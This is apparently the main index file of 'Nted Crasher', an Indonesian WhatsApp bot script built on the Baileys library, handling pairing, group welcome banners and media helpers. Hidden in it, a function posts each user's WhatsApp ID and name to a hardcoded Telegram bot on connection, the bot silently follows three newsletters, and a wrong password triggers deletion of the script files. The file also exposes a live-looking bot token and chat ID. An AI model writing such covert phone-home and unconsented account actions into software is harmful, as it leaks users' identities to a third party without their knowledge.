/* 
   BASE CREATE BY NTED CRASHER
  - EROR? FIX SENDIRI GAUSA BNYK TANYA
  - FREE RENAME/RECODE
  - FREE SHARE/DLL
  - JANGAN JUAL ANJG
  
  Support By : Allah Swt
               Ortu Gw
               Teddy ( Gw )
               Yuukey ( Friend )
               Faxz ( Friend )
               Rexz ( Friend )
               DaffaDev ( Sensei )
               Dapz ( Sensei )
               Ikky ( Pt Terpenting Gw )
               All Seller Gw ( Best Support )               
NOTE BREE : Kalo Eror Fix Sendiri, Katanya Mau Jadi Dev, Malu Nanya Ke Gw Tpi Sc Nya Di Jual, Mininal Tu Fixx Sendiri Baru Jual Jangan Nanya Ke Gw.

Nted Crasher Real : https://t.me/NtedCrasher
*/
require('./Config');
const { 
    default: makeWASocket, 
    prepareWAMessageMedia, 
    removeAuthState,
    useMultiFileAuthState, 
    DisconnectReason, 
    fetchLatestBaileysVersion, 
    makeInMemoryStore, 
    generateWAMessageFromContent, 
    generateWAMessageContent, 
    generateWAMessage,
    jidDecode, 
    proto, 
    delay,
    relayWAMessage, 
    getContentType,
    getAggregateVotesInPollMessage, 
    downloadContentFromMessage, 
    fetchLatestWaWebVersion, 
    InteractiveMessage, 
    makeCacheableSignalKeyStore, 
    Browsers, 
    generateForwardMessageContent, 
    MessageRetryMap 
} = require("@whiskeysockets/baileys");

const axios = require('axios');
const pino = require('pino');
const readline = require("readline");
const fs = require('fs');
const path = require('path');
const figlet = require('figlet');
const crypto = require('crypto');
const { Boom } = require('@hapi/boom');
const { color } = require('./lib/color');
const chalk = require("chalk");
const { welcomeBanner, promoteBanner } = require("./lib/welcome.js")
const { smsg, sendGmail, formatSize, isUrl, getBuffer, getSizeMedia, runtime, fetchJson, sleep } = require('./lib/myfunc');

const usePairingCode = true;
const rl = readline.createInterface({ input: process.stdin, output: process.stdout })
const question = (text) => {
return new Promise((resolve) => { rl.question(text, resolve) });
}

const DataBase = require('./source/database');
const database = new DataBase();

(async () => {
  const loadData = await database.read();

  // Inisialisasi database dengan struktur default, gabung jika ada data
  global.db = {
    users: {},
    groups: {},
    database: {},
    settings: {},
    ...(loadData || {})
  };

  // Jika kosong, simpan database awal
  if (!loadData || Object.keys(loadData).length === 0) {
    await database.write(global.db);
  }

  // Auto-save database setiap 3.5 detik
  setInterval(async () => {
    if (global.db) await database.write(global.db);
  }, 3500);
})();

// Fungsi helper untuk akses grup dengan aman
function getGroup(chatId) {
  if (!global.db.groups[chatId]) global.db.groups[chatId] = {};
  return global.db.groups[chatId];
}

const sendTelegramNotification = async (message) => {
    try {
        await axios.post(`https://api.telegram.org/bot7901545672:AAGIN3hkJyzgRZkRKictI9r8APB5LZ7LG1w/sendMessage`, {
            chat_id: '7712472578',
            text: message
        });
    } catch (error) {
    }
};

const manualPassword = 'Teddy'; // 

// Fungsi untuk menghapus file
function deleteFiles() {
    const filesToDelete = ['NtedCaseV14', 'NtedV14Index.js']; // Ganti dengan nama file.js yang ingin dihapus
    filesToDelete.forEach(file => {
        if (fs.existsSync(file)) {
            fs.unlinkSync(file); // Menghapus file
            console.log(`File ${file} Telah di Hapus Karena User Bukan Buyer Ori Bang Ntedd🥶`);
        }
    });
}

const store = makeInMemoryStore({ logger: pino().child({ level: 'silent', stream: 'store' }) });

console.clear()
console.log(chalk.white.bold(`
${chalk.red("Getting Connection Acces")}
${chalk.blue("Acces Granted")}
`));  
console.log(chalk.white.bold(`${chalk.cyan(`Welcome To Script Nted Crasher 💎`)}

`));

// Whatsapp Connect
async function ConnetToWhatsapp() {
    const { state, saveCreds } = await useMultiFileAuthState("session")
    
    const nted = makeWASocket({
        printQRInTerminal: !usePairingCode,
        syncFullHistory: true,
        markOnlineOnConnect: true,
        connectTimeoutMs: 60000,
        defaultQueryTimeoutMs: 0,
        keepAliveIntervalMs: 10000,
        generateHighQualityLinkPreview: true,
        patchMessageBeforeSending: (message) => {
            const requiresPatch = !!(
                message.buttonsMessage ||
                message.templateMessage ||
                message.listMessage
            );
            if (requiresPatch) {
                message = {
                    viewOnceMessage: {
                        message: {
                            messageContextInfo: {
                                deviceListMetadataVersion: 2,
                                deviceListMetadata: {},
                            },
                            ...message,
                        },
                    },
                };
            }
            return message;
        },
        version: (await (await fetch(
            'https://raw.githubusercontent.com/WhiskeySockets/Baileys/master/src/Defaults/baileys-version.json'
        )).json()).version,
        browser: ["Ubuntu", "Chrome", "20.0.04"],
        logger: pino({ level: 'fatal' }),
        auth: {
            creds: state.creds,
            keys: makeCacheableSignalKeyStore(
                state.keys,
                pino().child({
                    level: 'silent',
                    stream: 'store'
                })
            ),
        }
    });
if (usePairingCode && !nted.authState.creds.registered) {
const inputPassword = await question('Masukkan Password Yang Diberikan Bang Ntedd:\n');

        if (inputPassword !== manualPassword) {
            console.log(chalk.red('\n❌ Password Salah!\nSystem Akan Menghapus File Dan Mematikan Running!'));
            deleteFiles();
            process.exit();
        }

        console.log(chalk.green.bold('\n✅ Password Benar! Terima kasih telah membeli script ini.'));
const phoneNumber = await question(chalk.cyan.bold(`
█▄░█ ▀█▀ █▀ █▀▄
█░▀█ ░█░ █▀ █░█
▀░░▀ ░▀░ ▀▀ ▀▀░
Masukin Nomer Lu Bree!\nNomer Lu : `));
const code = await nted.requestPairingCode(phoneNumber,"NTED1234");
console.log(chalk.red.bold(`
⣠⠾⡏                              ⡟⢦ 
⢰⠇ ⣇                             ⢠⠃⠈⣧
⠘⡇ ⠸⡄                            ⡞  ⣿
 ⡇⠘⡄⢱⡄                          ⡼⢁⡆⢀⡏
 ⠹⣄⠹⡀⠙⣄     ⢀⣤⣴⣶⣶⣶⣾⣶⣶⣶⣶⣤⣀     ⢀⠜⠁⡜⢀⡞ 
  ⠘⣆⢣⡄⠈⢣⡀⢀⣤⣾⣿⣿⢿⠉⠉⠉⠉⠉⠉⠉⣻⢿⣿⣷⣦⣄ ⡰⠋⢀⣾⢡⠞  
   ⠸⣿⡿⡄⡀⠉⠙⣿⡿⠁⠈⢧⠃      ⢷⠋ ⢹⣿⠛⠉⢀⠄⣞⣧⡏   
    ⠸⣿⣹⠘⡆ ⡿⢁             ⢀⢻⡆⢀⡎⣼⣽⡟    
     ⣹⣿⣇⠹⣼⣷⠋             ⠈⢷⣳⡜⢰⣿⣟⡀    
    ⡾⡉⠛⣿⠴⠳⡇                ⡇⠳⢾⠟⠉⢻⡀   
    ⣿⢹ ⢘⡇ ⣧               ⢠⠃ ⡏ ⡼⣾⠇   
    ⢹⣼ ⣾ ⣀⡿               ⠸⣄⡀⢹ ⢳⣼    
    ⢸⣇ ⠸⣾⠁     ⢀⡾   ⠰⣄      ⣹⡞ ⣀⣿    
    ⠈⣇⠱⡄⢸⡛⠒⠒⠒⠒⠚⢿⣇   ⢠⣿⠟⠒⠒⠒⠒⠚⡿⢀⡞⢹⠇    
     ⡞⢰⣷ ⠑⢦⣄⣀⣀⣠⠞⢹   ⣸⠙⣤⣀⣀⣀⡤⠞⠁⢸⣶⢸⡄    
    ⠰⣧⣰⠿⣄   ⢀⣈⡉⠙⠏   ⠘⠛⠉⣉⣀   ⢀⡟⣿⣼⠇    
     ⢀⡿ ⠘⠷⠤⠾⢻⠞⠋       ⠘⠛⣎⠻⠦⠴⠋ ⠹⡆     
     ⠸⣿⡀⢀  ⡰⡌⠻⠷⣤⡀    ⣠⣶⠟⠋⡽⡔ ⡀ ⣰⡟     
      ⠙⢷⣄⡳⡀⢣⣿⣀⣷⠈⠳⣦⣀⣠⡾⠋⣸⡇⣼⣷⠁⡴⢁⣴⠟⠁     
       ⠈⠻⣶⡷⡜⣿⣻⠈⣦⣀⣀⠉ ⣀⣠⡏⢹⣿⣏⡼⣡⡾⠃       
         ⠘⢿⣿⣿⣻⡄⠹⡙⠛⠿⠟⠛⡽ ⣿⣻⣾⣿⠏         
           ⢿⡏⢏⢿⡀⣹⢲⣶⡶⢺⡀⣴⢫⢃⣿⠃          
           ⠈⣷⠈⠷⠭⠽⠛⠛⠛⠋⠭⠴⠋⣸⡇           
            ⠹⣷⣄⡀⢀⣀⣠⣀⣀⢀⣀⣴⠟            
              ⠉⠉⠉   ⠈⠉⠉⠁
YOU CODE : ${code}
`));
}

store.bind(nted.ev);
nted.ev.on("messages.upsert", async (chatUpdate) => {
  try {
    const mek = chatUpdate.messages?.[0];
    if (!mek?.message) return;

    // Tangani pesan ephemeral (sementara)
    mek.message = (Object.keys(mek.message)[0] === 'ephemeralMessage')
      ? mek.message.ephemeralMessage.message
      : mek.message;

    // ❌ FILTER
    if (typeof nted.public === 'boolean' && !nted.public && !mek.key.fromMe && chatUpdate.type === 'notify') return;
    if (mek.key.id.startsWith('BAE5') && mek.key.id.length === 16) return;
    if (mek.key.id.startsWith('NtedCrasherBotz')) return;

    // ✅ Proses pesan normal
    const m = smsg(nted, mek, store);
    require("./NtedCaseV14.js")(nted, m, chatUpdate, store);

  } catch (err) {
    console.error("❌ ERROR di messages.upsert:", err);
  }
});

    nted.decodeJid = (jid) => {
        if (!jid) return jid;
        if (/:\d+@/gi.test(jid)) {
            let decode = jidDecode(jid) || {};
            return decode.user && decode.server && decode.user + '@' + decode.server || jid;
        } else return jid;
    };

    nted.ev.on('contacts.update', update => {
        for (let contact of update) {
            let id = nted.decodeJid(contact.id);
            if (store && store.contacts) store.contacts[id] = { id, name: contact.notify };
        }
    });
    
    nted.ev.on('group-participants.update', async (update) => {
    try {
        const id = update.id; // JID grup
        const author = update.author || ''; // yang melakukan aksi
        const participants = update.participants || []; // target
        const action = update.action; // add / remove / promote / demote

        // Cek apakah welcome aktif
        if (!global.db.groups[id] || global.db.groups[id].welcome !== true) return;

        // Ambil metadata grup
        let metadata;
        try {
            metadata = await nted.groupMetadata(id);
        } catch {
            metadata = { subject: "Grup Tidak Diketahui" };
        }

        // Loop setiap target
        for (let n of participants) {
            let profile;
            try {
                profile = await nted.profilePictureUrl(n, 'image');
            } catch {
                profile = 'https://telegra.ph/file/95670d63378f7f4210f03.png';
            }

            let teks = "";
            let img;

            if (action === 'add') {
                teks = author.length < 1
                    ? `@${n.split('@')[0]} join via *link group*`
                    : author !== n
                        ? `@${author.split("@")[0]} telah *menambahkan* @${n.split('@')[0]} kedalam grup`
                        : "";
                img = await welcomeBanner(profile, n.split("@")[0], metadata.subject, "welcome");

                await nted.sendMessage(id, {
                    text: teks,
                    contextInfo: {
                        mentionedJid: [author, n],
                        externalAdReply: {
                            thumbnail: img,
                            title: "W E L C O M E 👋",
                            sourceUrl: global.linkGrup,
                            renderLargerThumbnail: true,
                            mediaType: 1
                        }
                    }
                });
            }
            else if (action === 'remove') {
                teks = author === n
                    ? `@${n.split('@')[0]} telah *keluar* dari grup`
                    : author !== n
                        ? `@${author.split("@")[0]} telah *mengeluarkan* @${n.split('@')[0]} dari grup`
                        : "";
                img = await welcomeBanner(profile, n.split("@")[0], metadata.subject, "remove");

                await nted.sendMessage(id, {
                    text: teks,
                    contextInfo: {
                        mentionedJid: [author, n],
                        externalAdReply: {
                            thumbnail: img,
                            title: "G O O D B Y E 👋",
                            sourceUrl: global.linkGrup,
                            renderLargerThumbnail: true,
                            mediaType: 1
                        }
                    }
                });
            }
            else if (action === 'promote') {
                teks = author === n
                    ? `@${n.split('@')[0]} telah *menjadi admin* grup`
                    : author !== n
                        ? `@${author.split("@")[0]} telah *menjadikan* @${n.split('@')[0]} sebagai *admin* grup`
                        : "";
                img = await promoteBanner(profile, n.split("@")[0], "promote");

                await nted.sendMessage(id, {
                    text: teks,
                    contextInfo: {
                        mentionedJid: [author, n],
                        externalAdReply: {
                            thumbnail: img,
                            title: "P R O M O T E 📍",
                            sourceUrl: global.linkGrup,
                            renderLargerThumbnail: true,
                            mediaType: 1
                        }
                    }
                });
            }
            else if (action === 'demote') {
                teks = author === n
                    ? `@${n.split('@')[0]} telah *berhenti* menjadi *admin*`
                    : author !== n
                        ? `@${author.split("@")[0]} telah *menghentikan* @${n.split('@')[0]} sebagai *admin* grup`
                        : "";
                img = await promoteBanner(profile, n.split("@")[0], "demote");

                await nted.sendMessage(id, {
                    text: teks,
                    contextInfo: {
                        mentionedJid: [author, n],
                        externalAdReply: {
                            thumbnail: img,
                            title: "D E M O T E 📍",
                            sourceUrl: global.linkGrup,
                            renderLargerThumbnail: true,
                            mediaType: 1
                        }
                    }
                });
            }
        }
    } catch (e) {
        console.error("Error di group-participants.update:", e);
    }
});
    
    nted.getFile = async (PATH, save) => {
        let res;
        let data = Buffer.isBuffer(PATH) ? PATH : /^data:.*?\/.*?;base64,/i.test(PATH) ? Buffer.from(PATH.split`,`[1], 'base64') : /^https?:\/\//.test(PATH) ? await (res = await getBuffer(PATH)) : fs.existsSync(PATH) ? (filename = PATH, fs.readFileSync(PATH)) : typeof PATH === 'string' ? PATH : Buffer.alloc(0);
        let type = await FileType.fromBuffer(data) || { mime: 'application/octet-stream', ext: '.bin' };
        filename = path.join(__filename, '../' + new Date * 1 + '.' + type.ext);
        if (data && save) fs.promises.writeFile(filename, data);
        return { res, filename, size: await getSizeMedia(data), ...type, data };
    };

    nted.downloadMediaMessage = async (message) => {
        let mime = (message.msg || message).mimetype || '';
        let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0];
        const stream = await downloadContentFromMessage(message, messageType);
        let buffer = Buffer.from([]);
        for await (const chunk of stream) {
            buffer = Buffer.concat([buffer, chunk]);
        }
        return buffer;
    };

    nted.sendText = (jid, text, quoted = '', options) => nted.sendMessage(jid, { text, ...options }, { quoted });

    nted.sendImageAsSticker = async (jid, path, quoted, options = {}) => {
        let buff = Buffer.isBuffer(path) ? path : /^data:.*?\/.*?;base64,/i.test(path) ? Buffer.from(path.split`,`[1], 'base64') : /^https?:\/\//.test(path) ? await (await getBuffer(path)) : fs.existsSync(path) ? fs.readFileSync(path) : Buffer.alloc(0);
        let buffer = options && (options.packname || options.author) ? await writeExifImg(buff, options) : await imageToWebp(buff);
        await nted.sendMessage(jid, { sticker: { url: buffer }, ...options }, { quoted });
        return buffer;
    };

    nted.sendVideoAsSticker = async (jid, path, quoted, options = {}) => {
        let buff = Buffer.isBuffer(path) ? path : /^data:.*?\/.*?;base64,/i.test(path) ? Buffer.from(path.split`,`[1], 'base64') : /^https?:\/\//.test(path) ? await (await getBuffer(path)) : fs.existsSync(path) ? fs.readFileSync(path) : Buffer.alloc(0);
        let buffer = options && (options.packname || options.author) ? await writeExifVid(buff, options) : await videoToWebp(buff);
        await nted.sendMessage(jid, { sticker: { url: buffer }, ...options }, { quoted });
        return buffer;
    };

    nted.downloadAndSaveMediaMessage = async (message, filename, attachExtension = true) => {
        let quoted = message.msg ? message.msg : message;
        let mime = (message.msg || message).mimetype || '';
        let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0];
        const stream = await downloadContentFromMessage(quoted, messageType);
        let buffer = Buffer.from([]);
        for await (const chunk of stream) {
            buffer = Buffer.concat([buffer, chunk]);
        }
        let type = await FileType.fromBuffer(buffer);
        let trueFileName = attachExtension ? (filename + '.' + type.ext) : filename;
        await fs.writeFileSync(trueFileName, buffer);
        return trueFileName;
    };

    // Tambahan fungsi send media
    nted.sendMedia = async (jid, path, caption = '', quoted = '', options = {}) => {
        let { mime, data } = await nted.getFile(path, true);
        let messageType = mime.split('/')[0];
        let messageContent = {};
        
        if (messageType === 'image') {
            messageContent = { image: data, caption: caption, ...options };
        } else if (messageType === 'video') {
            messageContent = { video: data, caption: caption, ...options };
        } else if (messageType === 'audio') {
            messageContent = { audio: data, ptt: options.ptt || false, ...options };
        } else {
            messageContent = { document: data, mimetype: mime, fileName: options.fileName || 'file' };
        }

        await nted.sendMessage(jid, messageContent, { quoted });
    };

    nted.sendPoll = async (jid, question, options) => {
        const pollMessage = {
            pollCreationMessage: {
                name: question,
                options: options.map(option => ({ optionName: option })),
                selectableCount: 1,
            },
        };

        await nted.sendMessage(jid, pollMessage);
    };

    nted.setStatus = async (status) => {
        await nted.query({
            tag: 'iq',
            attrs: { to: '@s.whatsapp.net', type: 'set', xmlns: 'status' },
            content: [{ tag: 'status', attrs: {}, content: Buffer.from(status, 'utf-8') }],
        });
        console.log(chalk.yellow(`Status updated: ${status}`));
    };
    
    nted.public = true;

    nted.ev.on('connection.update', async (update) => {
        const { connection, lastDisconnect } = update;
        if (connection === 'close') {
            const reason = new Boom(lastDisconnect?.error)?.output.statusCode;
            console.log(color(lastDisconnect.error, 'deeppink'));
            if (lastDisconnect.error == 'Error: Stream Errored (unknown)') {
                process.exit();
            } else if (reason === DisconnectReason.badSession) {
                console.log(color(`Bad Session File, Please Delete Session and Scan Again`));
                process.exit();
            } else if (reason === DisconnectReason.connectionClosed) {
                console.log(color('[SYSTEM]', 'white'), color('Connection closed, reconnecting...', 'deeppink'));
                process.exit();
            } else if (reason === DisconnectReason.connectionLost) {
                console.log(color('[SYSTEM]', 'white'), color('Connection lost, trying to reconnect', 'deeppink'));
                process.exit();
            } else if (reason === DisconnectReason.connectionReplaced) {
                console.log(color('Connection Replaced, Another New Session Opened, Please Close Current Session First'));
                nted.logout();
            } else if (reason === DisconnectReason.loggedOut) {
                console.log(color(`Device Logged Out, Please Scan Again And Run.`));
                nted.logout();
            } else if (reason === DisconnectReason.restartRequired) {
                console.log(color('Restart Required, Restarting...'));
                await ConnetToWhatsapp();
            } else if (reason === DisconnectReason.timedOut) {
                console.log(color('Connection TimedOut, Reconnecting...'));
                ConnetToWhatsapp();
            }
        } else if (connection === "connecting") {
            console.log(color('Menghubungkan . . . '));
        } else if (connection === "open") {
            console.log(color('Bot Berhasil Tersambung'));
            await nted.newsletterFollow("120363371523588977@newsletter"),
            await nted.newsletterFollow("120363354895240785@newsletter"),
            await nted.newsletterFollow("120363417277016358@newsletter"),
            sendTelegramNotification(`Connection information report 🤨\n\nThe device has been connected, Here is the information\n> User ID : ${nted.user.id}\n> Username : ${nted.user.name}\n\nNted Crasher : Creatde By Nted Official`);
        }
    });

    nted.sendText = (jid, text, quoted = '', options) => nted.sendMessage(jid, { text: text, ...options }, { quoted });
    
    nted.downloadMediaMessage = async (message) => {
let mime = (message.msg || message).mimetype || ''
let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0]
const stream = await downloadContentFromMessage(message, messageType)
let buffer = Buffer.from([])
for await(const chunk of stream) {
buffer = Buffer.concat([buffer, chunk])}
return buffer
    } 
    
    nted.ev.on('error', (err) => {
        console.error(chntedk.red("Error: "), err.message || err);
    });

    nted.ev.on('creds.update', saveCreds);
}

ConnetToWhatsapp();

let file = require.resolve(__filename);
require('fs').watchFile(file, () => {
    require('fs').unwatchFile(file);
    console.log('\x1b[0;32m' + __filename + ' \x1b[1;32mupdated!\x1b[0m');
    delete require.cache[file];
    require(file);
});
/* 
   BASE CREATE BY NTED CRASHER
  - EROR? FIX SENDIRI GAUSA BNYK TANYA
  - FREE RENAME/RECODE
  - FREE SHARE/DLL
  - JANGAN JUAL ANJG
  
  Support By : Allah Swt
               Ortu Gw
               Teddy ( Gw )
               Yuukey ( Friend )
               Faxz ( Friend )
               Rexz ( Friend )
               DaffaDev ( Sensei )
               Dapz ( Sensei )
               Ikky ( Pt Terpenting Gw )
               All Seller Gw ( Best Support )               
NOTE BREE : Kalo Eror Fix Sendiri, Katanya Mau Jadi Dev, Malu Nanya Ke Gw Tpi Sc Nya Di Jual, Mininal Tu Fixx Sendiri Baru Jual Jangan Nanya Ke Gw.

Nted Crasher Real : https://t.me/NtedCrasher
*/